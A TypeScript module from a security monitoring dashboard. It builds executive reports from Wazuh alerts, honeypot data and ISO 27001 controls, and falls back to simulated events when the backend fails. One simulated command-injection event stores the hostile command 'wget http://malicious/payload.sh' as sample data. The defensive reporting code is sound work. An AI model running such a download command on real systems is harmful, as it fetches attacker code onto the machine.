import type { AlertOut, AnalysisOut, EventOut } from "./api";
import logger from "./logger";

type SeverityKey = "low" | "medium" | "high" | "critical";

export type GeoEntry = {
  country: string;
  code: string;
  pct: number;
  desc: string;
};

export type TopThreat = {
  attackType: string;
  severity: SeverityKey;
  count: number;
};

export type IsoControl = {
  control: string;
  status: "covered" | "partial" | "gap";
  note: string;
};

type BackendWazuhMetrics = {
  total_alerts: number;
  critical_alerts: number;
  top_affected_assets: Array<{ name: string; ip: string; alerts: number }>;
};
type BackendMitreCoverage = { tactic: string; count: number; level: string; icon: string };
type BackendHoneypotIntel = { unique_attackers: number; top_passwords_captured: string[]; malware_samples_collected: number };
type BackendIncidentManagement = { total_tickets: number; closed_tickets: number; avg_resolution_time_min: number };
type BackendRemediationStep = { task: string; action_cmd?: string };

type BackendReportResponse = {
  source: "api";
  generatedAt: string;
  executiveSummary: string;
  riskScore: number;
  metrics: Record<string, unknown>;
  topThreats: TopThreat[];
  iso27001: { overall: number; controls: IsoControl[] };
  recommendations: string[];
  executive_summary?: { status: string; health_score: number; key_finding: string };
  wazuh_metrics?: BackendWazuhMetrics;
  mitre_coverage?: BackendMitreCoverage[];
  honeypot_intel?: BackendHoneypotIntel;
  incident_management?: BackendIncidentManagement;
  remediation_steps?: BackendRemediationStep[];
  report_metadata?: { report_id: string; generation_date: string; analyst_name: string; company_name: string; period: string };
};

export type ExecutiveReportData = {
  source: "api" | "fallback";
  generatedAt: string;
  riskScore: number;
  executiveSummary: string;
  metrics: {
    totalAlerts: number;
    criticalAlerts: number;
    bySeverity: Record<SeverityKey, number>;
  };
  topThreats: TopThreat[];
  iso27001: {
    overall: number;
    controls: IsoControl[];
  };
  recommendations: string[];
  geoIntel?: GeoEntry[];
  wazuhMetrics?: BackendWazuhMetrics;
  mitreCoverage?: BackendMitreCoverage[];
  honeypotIntel?: BackendHoneypotIntel;
  incidentManagement?: BackendIncidentManagement;
  remediationSteps?: BackendRemediationStep[];
  backendKeyFinding?: string;
  analystNameFromBackend?: string;
};

const envApiBase = (import.meta.env.VITE_API_BASE_URL || "").trim();
const fallbackApiBase =
  typeof window !== "undefined"
    ? `${window.location.protocol}//${window.location.hostname}:8000`
    : "http://localhost:8000";
const API_BASE = envApiBase || fallbackApiBase;

function normalizeSeverity(value: string | null | undefined): SeverityKey {
  const raw = (value || "").toLowerCase();
  if (raw === "critical") return "critical";
  if (raw === "high") return "high";
  if (raw === "medium") return "medium";
  return "low";
}

async function http<T>(path: string, init?: RequestInit): Promise<T> {
  const headers: Record<string, string> = {
    "Content-Type": "application/json",
    ...(init?.headers as Record<string, string> || {}),
  };
  if (typeof document !== "undefined") {
    const match = document.cookie.match(/(^| )csrf_token=([^;]+)/);
    if (match) headers["X-CSRF-Token"] = match[2];
  }
  const res = await fetch(`${API_BASE}${path}`, {
    ...init,
    headers,
    credentials: "include",
  });
  if (!res.ok) {
    const text = await res.text().catch(() => "");
    throw new Error(`HTTP ${res.status} ${res.statusText}: ${text}`);
  }
  return (await res.json()) as T;
}

function fallbackEvents(): EventOut[] {
  const now = Date.now();
  return [
    {
      id: 501,
      timestamp: new Date(now - 5 * 60_000).toISOString(),
      source_ip: "185.244.25.93",
      attack_type: "Brute Force SSH",
      payload: { attempts: 27, user: "root" },
      raw_log: { sensor: "cowrie", protocol: "ssh", geo: "RU" },
    },
    {
      id: 502,
      timestamp: new Date(now - 22 * 60_000).toISOString(),
      source_ip: "91.240.118.17",
      attack_type: "Credential Stuffing",
      payload: { attempts: 41, target: "admin" },
      raw_log: { sensor: "cowrie", protocol: "ssh", geo: "NL" },
    },
    {
      id: 503,
      timestamp: new Date(now - 55 * 60_000).toISOString(),
      source_ip: "103.152.220.9",
      attack_type: "Reconnaissance Scan",
      payload: { ports: [22, 80, 443, 8080] },
      raw_log: { sensor: "wazuh", category: "network-scan", geo: "SG" },
    },
    {
      id: 504,
      timestamp: new Date(now - 90 * 60_000).toISOString(),
      source_ip: "198.51.100.44",
      attack_type: "Suspicious Command Injection",
      payload: { command: "wget http://malicious/payload.sh" },
      raw_log: { sensor: "wazuh", category: "web-attack", geo: "US" },
    },
  ];
}

function fallbackAlerts(events: EventOut[]): AlertOut[] {
  const now = Date.now();
  return [
    {
      id: 9101,
      event_id: events[0]?.id ?? null,
      severity: "critical",
      rule_id: "WAZUH-5710",
      description: "Multiple failed SSH logins indicate brute-force campaign.",
      timestamp: new Date(now - 4 * 60_000).toISOString(),
      raw_alert: { rule: "authentication_failures", threshold: 20 },
    },
    {
      id: 9102,
      event_id: events[1]?.id ?? null,
      severity: "high",
      rule_id: "WAZUH-5763",
      description: "Repeated authentication attempts from known risky origin.",
      timestamp: new Date(now - 18 * 60_000).toISOString(),
      raw_alert: { rule: "credential_stuffing_pattern", threshold: 30 },
    },
    {
      id: 9103,
      event_id: events[2]?.id ?? null,
      severity: "medium",
      rule_id: "WAZUH-1002",
      description: "Host scan behavior detected against exposed services.",
      timestamp: new Date(now - 45 * 60_000).toISOString(),
      raw_alert: { rule: "network_scan_detected", services: 4 },
    },
    {
      id: 9104,
      event_id: events[3]?.id ?? null,
      severity: "critical",
      rule_id: "WAZUH-31103",
      description: "Command injection signature observed in web payload.",
      timestamp: new Date(now - 80 * 60_000).toISOString(),
      raw_alert: { rule: "command_injection_attempt", confidence: "high" },
    },
    {
      id: 9105,
      event_id: null,
      severity: "low",
      rule_id: "WAZUH-2001",
      description: "Isolated failed login below escalation threshold.",
      timestamp: new Date(now - 110 * 60_000).toISOString(),
      raw_alert: { rule: "single_auth_failure" },
    },
  ];
}

function countBySeverity(alerts: AlertOut[]): Record<SeverityKey, number> {
  return alerts.reduce(
    (acc, item) => {
      acc[normalizeSeverity(item.severity)] += 1;
      return acc;
    },
    { low: 0, medium: 0, high: 0, critical: 0 },
  );
}

function buildTopThreats(alerts: AlertOut[], events: EventOut[]): TopThreat[] {
  const eventById = new Map(events.map((event) => [event.id, event]));
  const grouped = new Map<string, { count: number; severity: SeverityKey }>();

  alerts.forEach((alert) => {
    const eventType = alert.event_id ? eventById.get(alert.event_id)?.attack_type : null;
    const key = eventType || alert.description || "Unclassified threat";
    const sev = normalizeSeverity(alert.severity);
    const current = grouped.get(key);
    if (!current) {
      grouped.set(key, { count: 1, severity: sev });
      return;
    }
    current.count += 1;
    if (severityRank(sev) > severityRank(current.severity)) {
      current.severity = sev;
    }
  });

  return Array.from(grouped.entries())
    .map(([attackType, value]) => ({
      attackType,
      severity: value.severity,
      count: value.count,
    }))
    .sort((a, b) => b.count - a.count || severityRank(b.severity) - severityRank(a.severity))
    .slice(0, 5);
}

function severityRank(sev: SeverityKey): number {
  switch (sev) {
    case "critical":
      return 4;
    case "high":
      return 3;
    case "medium":
      return 2;
    default:
      return 1;
  }
}

function calculateRiskScore(bySeverity: Record<SeverityKey, number>): number {
  const weighted =
    bySeverity.critical * 30 + bySeverity.high * 18 + bySeverity.medium * 10 + bySeverity.low * 4;
  return Math.max(0, Math.min(100, weighted));
}

function buildIsoAssessment(bySeverity: Record<SeverityKey, number>, totalAlerts: number) {
  const incidentReadiness = Math.max(35, 92 - bySeverity.critical * 13 - bySeverity.high * 6);
  const monitoringCoverage = Math.max(45, 95 - Math.max(0, totalAlerts - 8) * 3);
  const identityControl = Math.max(40, 88 - (bySeverity.critical + bySeverity.high) * 8);
  const overall = Math.round((incidentReadiness + monitoringCoverage + identityControl) / 3);

  const controls: IsoControl[] = [
    {
      control: "A.5.7 Threat Intelligence",
      status: bySeverity.critical > 0 ? "partial" : "covered",
      note: "Alert intelligence available, requires stronger enrichment for critical events.",
    },
    {
      control: "A.5.24 Incident Management Planning",
      status: bySeverity.critical > 1 ? "gap" : "partial",
      note: "Escalation process exists, but critical volume pressures response SLA.",
    },
    {
      control: "A.8.16 Monitoring Activities",
      status: totalAlerts > 0 ? "covered" : "partial",
      note: "Continuous event and alert monitoring is active in SOC dashboard.",
    },
  ];

  return { overall, controls };
}

function buildRecommendations(bySeverity: Record<SeverityKey, number>, topThreats: TopThreat[]): string[] {
  const base: string[] = [];
  if (bySeverity.critical > 0) {
    base.push("P1 - Activar contencion inmediata en origenes con alertas criticas y forzar rotacion de credenciales privilegiadas.");
  }
  if (bySeverity.high > 0) {
    base.push("P2 - Implementar endurecimiento de SSH (MFA, allowlist de IP y bloqueo por intentos) para reducir riesgo de acceso no autorizado.");
  }
  if (topThreats.length > 0) {
    base.push(`P3 - Priorizar regla de deteccion para '${topThreats[0].attackType}' y ajustar umbrales para bajar tiempo de deteccion.`);
  }
  base.push("P4 - Formalizar reporte semanal ISO 27001 con responsables y fecha objetivo por accion.");
  return base;
}

function fallbackSummary(score: number, criticalAlerts: number, topThreats: TopThreat[]): string {
  const threat = topThreats[0]?.attackType || "actividad maliciosa recurrente";
  return `Riesgo global ${score}/100. Se registran ${criticalAlerts} alertas criticas con predominio de ${threat}. Se recomienda contencion inmediata en accesos expuestos y refuerzo de controles preventivos para proteger continuidad operativa y reputacion del negocio.`;
}

async function generateExecutiveSummary(alerts: AlertOut[], fallback: string): Promise<string> {
  const critical = alerts.filter((a) => normalizeSeverity(a.severity) === "critical").slice(0, 2);
  if (critical.length === 0) return fallback;

  try {
    const analyses = await Promise.all(
      critical.map((alert) => http<AnalysisOut>(`/api/analyze/${alert.id}`, { method: "POST" })),
    );
    const joined = analyses
      .map((item) => `${item.summary}. Accion: ${item.recommended_action}.`)
      .join(" ");
    return joined || fallback;
  } catch {
    return fallback;
  }
}

const GEO_NAMES: Record<string, string> = {
  CN: "China", RU: "Rusia", NL: "Países Bajos", US: "Estados Unidos",
  DE: "Alemania", BR: "Brasil", SG: "Singapur", IN: "India",
  UA: "Ucrania", FR: "Francia", KR: "Corea del Sur", IR: "Irán",
};

const GEO_DESCS: Record<string, string> = {
  CN: "Ataques de fuerza bruta y reconocimiento masivo",
  RU: "Credential stuffing y escaneo de servicios",
  NL: "Tráfico a través de proxies anónimos",
  US: "Inyección de comandos en servicios web",
  DE: "Escaneo de puertos y reconocimiento",
  BR: "Ataques de fuerza bruta SSH",
  SG: "Reconocimiento de servicios expuestos",
  IN: "Escaneo automatizado de vulnerabilidades",
  UA: "Ataques dirigidos a servicios RDP",
  FR: "Tráfico sospechoso de salida",
  KR: "Intentos de acceso a paneles de administración",
  IR: "Actividad de escaneo persistente",
};

const FALLBACK_GEO: GeoEntry[] = [
  { country: "China", code: "CN", pct: 38, desc: GEO_DESCS.CN },
  { country: "Rusia", code: "RU", pct: 27, desc: GEO_DESCS.RU },
  { country: "Países Bajos", code: "NL", pct: 14, desc: GEO_DESCS.NL },
  { country: "Singapur", code: "SG", pct: 11, desc: GEO_DESCS.SG },
  { country: "Estados Unidos", code: "US", pct: 10, desc: GEO_DESCS.US },
];

function buildGeoIntel(events: EventOut[]): GeoEntry[] {
  const counts: Record<string, number> = {};
  events.forEach((e) => {
    const code = (e.raw_log as Record<string, unknown>)?.geo as string | undefined;
    if (code) counts[code] = (counts[code] || 0) + 1;
  });
  const total = Object.values(counts).reduce((s, v) => s + v, 0) || 1;
  return Object.entries(counts)
    .sort(([, a], [, b]) => b - a)
    .slice(0, 5)
    .map(([code, count]) => ({
      country: GEO_NAMES[code] || code,
      code,
      pct: Math.round((count / total) * 100),
      desc: GEO_DESCS[code] || "Actividad sospechosa detectada",
    }));
}

async function fetchGeoIntel(): Promise<GeoEntry[]> {
  try {
    const events = await http<EventOut[]>("/events?limit=200");
    const geo = buildGeoIntel(events);
    return geo.length > 0 ? geo : FALLBACK_GEO;
  } catch {
    return FALLBACK_GEO;
  }
}

export async function fetchExecutiveReportData(): Promise<ExecutiveReportData> {
  // Ahora llamamos directamente al endpoint del backend que ya procesa OpenSearch y Ollama
  try {
    const data = await http<BackendReportResponse>("/api/reports/executive");
    const geoIntel = await fetchGeoIntel();
    const criticalAlerts = data.wazuh_metrics?.critical_alerts ?? 0;
    const totalAlerts = data.wazuh_metrics?.total_alerts ?? 0;
    return {
      source: "api",
      generatedAt: data.generatedAt,
      riskScore: data.riskScore,
      executiveSummary: data.executiveSummary,
      metrics: {
        totalAlerts,
        criticalAlerts,
        bySeverity: { low: 0, medium: 0, high: 0, critical: criticalAlerts },
      },
      topThreats: data.topThreats ?? [],
      iso27001: data.iso27001,
      recommendations: data.recommendations ?? [],
      geoIntel,
      wazuhMetrics: data.wazuh_metrics,
      mitreCoverage: data.mitre_coverage,
      honeypotIntel: data.honeypot_intel,
      incidentManagement: data.incident_management,
      remediationSteps: data.remediation_steps,
      backendKeyFinding: data.executive_summary?.key_finding ?? data.executiveSummary,
      analystNameFromBackend: data.report_metadata?.analyst_name,
    };
  } catch (e) {
    logger.error("Error fetching real executive report, falling back to local simulation:", e);
    
    // Fallback local en caso de error de red o backend no disponible
    const events = fallbackEvents();
    const alerts = fallbackAlerts(events);
    const bySeverity = countBySeverity(alerts);
    const topThreats = buildTopThreats(alerts, events);
    const riskScore = calculateRiskScore(bySeverity);
    const iso27001 = buildIsoAssessment(bySeverity, alerts.length);
    const recommendations = buildRecommendations(bySeverity, topThreats);
    const summary = fallbackSummary(riskScore, bySeverity.critical, topThreats);

    return {
      source: "fallback",
      generatedAt: new Date().toISOString(),
      riskScore,
      executiveSummary: summary,
      metrics: {
        totalAlerts: alerts.length,
        criticalAlerts: bySeverity.critical,
        bySeverity,
      },
      topThreats,
      iso27001,
      recommendations,
      geoIntel: FALLBACK_GEO,
    };
  }
}
